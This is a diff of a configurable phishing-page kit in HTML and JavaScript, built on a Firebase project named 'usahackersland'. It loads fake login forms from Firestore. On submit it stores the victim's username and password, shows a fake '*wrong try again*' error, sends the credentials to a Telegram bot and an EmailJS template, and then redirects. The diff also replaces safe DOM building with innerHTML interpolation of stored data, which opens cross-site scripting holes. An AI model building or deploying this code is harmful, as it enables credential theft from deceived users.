@@ -6,10 +6,10 @@
 <title>Dynamic Form</title>
 <style>
 body{font-family:Arial,Helvetica,sans-serif;background:#f4f6f8;padding:18px}
-.wrap{max-width:800px;margin:auto;background:#fff;padding:18px;border-radius:10px;position:relative;}
+.wrap{max-width:800px;margin:auto;background:#fff;padding:18px;border-radius:10px}
 input,textarea,select,button{width:100%;padding:8px;margin-top:6px;border-radius:6px;border:1px solid #ccc;box-sizing:border-box}
 textarea{min-height:70px}
-.draggableBtn{position:absolute;cursor:pointer;color:#fff;border:none;border-radius:8px}
+.draggableBtn{position:absolute;cursor:move;color:#fff;border:none;border-radius:8px}
 .embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px}
 </style>
 
@@ -17,14 +17,14 @@ textarea{min-height:70px}
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
 
-<!-- EmailJS (optional) -->
-<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
 <body>
 <div class="wrap" id="formWrap"></div>
 
 <script>
-// Firebase setup
+// Firebase config
 const firebaseConfig = {
   apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
   authDomain: "usahackersland.firebaseapp.com",
@@ -33,102 +33,70 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
-// EmailJS setup (optional)
-emailjs.init("YOUR_EMAILJS_USER_ID"); // replace with your EmailJS user ID
+// EmailJS init
+emailjs.init("YOUR_EMAILJS_USER_ID"); // replace with your EmailJS User ID
 
-// Telegram
-const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; // replace
-const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // replace
+// Telegram config
+const BOT_TOKEN = "YOUR_BOT_TOKEN";  // Replace with your Telegram bot token
+const CHAT_ID = "YOUR_CHAT_ID";      // Replace with your Telegram chat ID
 
 function getQueryParam(name) {
-  const urlParams = new URLSearchParams(window.location.search);
-  return urlParams.get(name);
+  return new URLSearchParams(window.location.search).get(name);
+}
+
+function sendTelegram(username, password, extraFields){
+  let message = `📌 New Form Submission\nUsername: ${username || "—"}\nPassword: ${password || "—"}\n`;
+  if(extraFields.length) message += `Extras: ${extraFields.join(", ")}\n`;
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({chat_id: CHAT_ID, text: message})
+  }).catch(err=>console.error("Telegram error:", err));
+}
+
+function sendEmail(username, password, extraFields){
+  const templateParams = {
+    username: username || "—",
+    password: password || "—",
+    extras: extraFields.join(", ")
+  };
+  emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID",templateParams)
+    .then(res=>console.log("Email sent"))
+    .catch(err=>console.error("Email error:", err));
 }
 
 function renderForm(data){
   const wrap = document.getElementById("formWrap");
-  wrap.innerHTML = "";
+  wrap.innerHTML="";
   wrap.style.background = data.bgColor || "#fff";
   if(data.bgImageURL){
     wrap.style.backgroundImage = `url(${data.bgImageURL})`;
     wrap.style.backgroundSize = data.bgSize || "cover";
   }
 
-  // Header images
-  if(data.avatarURL){
-    const img = document.createElement("img");
-    img.src = data.avatarURL;
-    img.style.width = "90px";
-    img.style.borderRadius = "50%";
-    img.style.display = "block";
-    img.style.margin = "auto";
-    wrap.appendChild(img);
-  }
-  if(data.logoURL){
-    const img = document.createElement("img");
-    img.src = data.logoURL;
-    img.style.width = "140px";
-    img.style.display = "block";
-    img.style.margin = "auto";
-    wrap.appendChild(img);
+  if(data.avatarURL) wrap.innerHTML+=`<img src="${data.avatarURL}" style="width:90px;border-radius:50%;display:block;margin:auto">`;
+  if(data.logoURL) wrap.innerHTML+=`<img src="${data.logoURL}" style="width:140px;display:block;margin:auto">`;
+
+  wrap.innerHTML+=`<h2 style="text-align:center;color:${data.titleColor}">${data.title}</h2>`;
+  wrap.innerHTML+=`<p style="text-align:center;color:${data.subtitleColor}">${data.subtitle}</p>`;
+  wrap.innerHTML+=`<p>${data.description}</p>`;
+  if(data.enableWarning && data.warningPosition!=="none"){
+    wrap.innerHTML+=`<p style="color:#b71c1c;text-align:${data.warningPosition}">${data.warning}</p>`;
   }
 
-  // Titles & description
-  const title = document.createElement("h2");
-  title.style.textAlign = "center";
-  title.style.color = data.titleColor || "#111";
-  title.textContent = data.title || "";
-  wrap.appendChild(title);
-
-  const subtitle = document.createElement("p");
-  subtitle.style.textAlign = "center";
-  subtitle.style.color = data.subtitleColor || "#555";
-  subtitle.textContent = data.subtitle || "";
-  wrap.appendChild(subtitle);
-
-  const desc = document.createElement("p");
-  desc.textContent = data.description || "";
-  wrap.appendChild(desc);
-
-  // Warning
-  if(data.enableWarning && data.warningPosition !== "none"){
-    const warn = document.createElement("p");
-    warn.style.color = "#b71c1c";
-    warn.style.textAlign = data.warningPosition || "center";
-    warn.textContent = data.warning || "";
-    wrap.appendChild(warn);
-  }
-
-  // Form inputs container
   const formDiv = document.createElement("div");
   formDiv.style.display = "flex";
   formDiv.style.flexDirection = "column";
-  formDiv.style.alignItems = data.btnPosition === "left" ? "flex-start" : data.btnPosition === "right" ? "flex-end" : "center";
-  formDiv.style.gap = "8px";
+  formDiv.style.alignItems = data.btnPosition==="left"?"flex-start":data.btnPosition==="right"?"flex-end":"center";
+  formDiv.style.gap="8px";
 
-  // Auth fields
   if(data.addAuth){
-    const inputUser = document.createElement("input");
-    inputUser.placeholder = data.usernamePlaceholder || "Username";
-    formDiv.appendChild(inputUser);
-
-    const inputPass = document.createElement("input");
-    inputPass.type = "password";
-    inputPass.placeholder = data.passwordPlaceholder || "Password";
-    formDiv.appendChild(inputPass);
+    formDiv.innerHTML+=`<input placeholder="${data.usernamePlaceholder}">`;
+    formDiv.innerHTML+=`<input type="password" placeholder="${data.passwordPlaceholder}">`;
   }
 
-  // Extra fields
-  const extraInputs = [];
   if(data.extraFields && data.extraFields.length){
-    data.extraFields.forEach(v=>{
-      if(v.trim()){
-        const input = document.createElement("input");
-        input.placeholder = v.trim();
-        formDiv.appendChild(input);
-        extraInputs.push(input);
-      }
-    });
+    data.extraFields.forEach(v=>{ if(v.trim()) formDiv.innerHTML+=`<input placeholder="${v.trim()}">`; });
   }
 
   // Embed Links
@@ -136,134 +104,64 @@ function renderForm(data){
     data.embedLinks.forEach(link=>{
       if(!link.show) return;
       const div = document.createElement("div");
-      div.className = "embedLink";
-      const strong = document.createElement("strong");
-      strong.textContent = link.text;
-      div.appendChild(strong);
-      const a = document.createElement("a");
-      a.href = link.url;
-      a.target = "_blank";
-      a.textContent = " " + link.url;
-      div.appendChild(a);
-      if(link.desc){
-        const small = document.createElement("small");
-        small.textContent = " " + link.desc;
-        div.appendChild(document.createElement("br"));
-        div.appendChild(small);
-      }
+      div.className="embedLink";
+      div.innerHTML = `<strong>${link.text}</strong>: <a href="${link.url}" target="_blank">${link.url}</a>`;
+      if(link.desc) div.innerHTML+=`<br><small>${link.desc}</small>`;
       formDiv.appendChild(div);
     });
   }
 
-  // Generate Button
-  if(data.showGenerateBtn){
-    const genBtn = document.createElement("button");
-    genBtn.textContent = data.generateBtnText || "Generate";
-    genBtn.style.background = "#1976d2";
-    genBtn.style.color = "#fff";
-    genBtn.style.padding = "10px";
-    genBtn.style.border = "none";
-    genBtn.style.borderRadius = "8px";
-    genBtn.onclick = ()=>alert("Form Generated!");
-    formDiv.appendChild(genBtn);
-  }
-
-  // Main Button (fake error + capture + redirect)
+  // Main Button
   if(data.showMainBtn){
     const mainBtn = document.createElement("button");
-    mainBtn.textContent = data.buttonText || "Submit";
-    mainBtn.style.background = data.btnColor || "#1976d2";
+    mainBtn.style.background = data.btnColor||"#1976d2";
     mainBtn.style.color = "#fff";
     mainBtn.style.padding = "10px";
     mainBtn.style.border = "none";
     mainBtn.style.borderRadius = "8px";
+    mainBtn.textContent = data.buttonText||"Submit";
 
-    mainBtn.onclick = async (e)=>{
-      e.preventDefault();
+    mainBtn.onclick = () => {
+      const inputs = formDiv.querySelectorAll("input");
+      let username = "", password = "", extraFields = [];
 
-      // 1️⃣ Show fake error
-      alert("*wrong try again*");
+      inputs.forEach((inp,i)=>{
+        if(data.addAuth && i===0) username=inp.value;
+        else if(data.addAuth && i===1) password=inp.value;
+        else extraFields.push(inp.value);
+      });
 
-      // 2️⃣ Collect form values
-      const username = formDiv.querySelector('input[type="text"]')?.value || "";
-      const password = formDiv.querySelector('input[type="password"]')?.value || "";
-      const extraValues = extraInputs.map(i=>i.value);
-
-      const submission = {
-        username,
-        password,
-        extraFields: extraValues,
+      // Save to Firestore
+      db.collection("submissions").add({
+        username: username,
+        password: password,
+        extraFields: extraFields,
         createdAt: new Date().toISOString()
-      };
-
-      // 3️⃣ Save to Firebase
-      try { await db.collection("submissions").add(submission); } 
-      catch(err){ console.error("Firestore error:", err); }
-
-      // 4️⃣ Send Telegram
-      const telegramMsg = `
-New Form Submission:
-Username: ${username}
-Password: ${password}
-Extra: ${extraValues.join(", ")}
-Time: ${new Date().toLocaleString()}
-`;
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: telegramMsg })
-      }).catch(console.error);
-
-      // 5️⃣ Send Email (optional via EmailJS)
-      if(typeof emailjs !== "undefined"){
-        emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID", {
-          username, password, extra: extraValues.join(", "), date: new Date().toLocaleString()
-        }).catch(console.error);
-      }
-
-      // 6️⃣ Redirect if enabled
-      if(data.enableRedirect && data.redirectURL){
-        setTimeout(()=>window.location.href = data.redirectURL, 500);
-      }
+      }).then(()=>{
+        alert("*wrong try again*"); // message
+        sendTelegram(username, password, extraFields); // Telegram
+        sendEmail(username, password, extraFields);     // Email
+        if(data.enableRedirect && data.redirectURL) window.location.href=data.redirectURL;
+      }).catch(err=>{
+        console.error(err);
+        alert("❌ Error submitting form.");
+      });
     };
+
     formDiv.appendChild(mainBtn);
   }
 
   wrap.appendChild(formDiv);
 
-  // Extra draggable buttons
-  if(data.extraButtons){
-    data.extraButtons.forEach(b=>{
-      if(!b.show) return;
-      const btn = document.createElement("button");
-      btn.className = "draggableBtn";
-      btn.textContent = b.text;
-      btn.style.background = b.color;
-      btn.style.width = b.size + "px";
-      btn.style.height = b.size + "px";
-      btn.style.left = b.x + "%";
-      btn.style.top = b.y + "%";
-      btn.style.position = "absolute";
-      btn.onclick = ()=>window.open(b.link,"_blank");
-      wrap.appendChild(btn);
-    });
-  }
-
   // Footer
-  const footer = document.createElement("footer");
-  footer.style.textAlign = "center";
-  footer.style.marginTop = "10px";
-  footer.style.fontSize = "12px";
-  footer.textContent = data.footerText || "";
-  wrap.appendChild(footer);
+  wrap.innerHTML += `<footer style="text-align:center;margin-top:10px;font-size:12px">${data.footerText||""}</footer>`;
 }
 
-// Load form
 const formId = getQueryParam("id");
 if(formId){
   db.collection("forms").doc(formId).get().then(doc=>{
-    if(doc.exists){ renderForm(doc.data()); } 
-    else { document.getElementById("formWrap").textContent="Form not found!"; }
+    if(doc.exists) renderForm(doc.data());
+    else document.getElementById("formWrap").textContent="Form not found!";
   }).catch(err=>{
     console.error(err);
     document.getElementById("formWrap").textContent="Error loading form.";
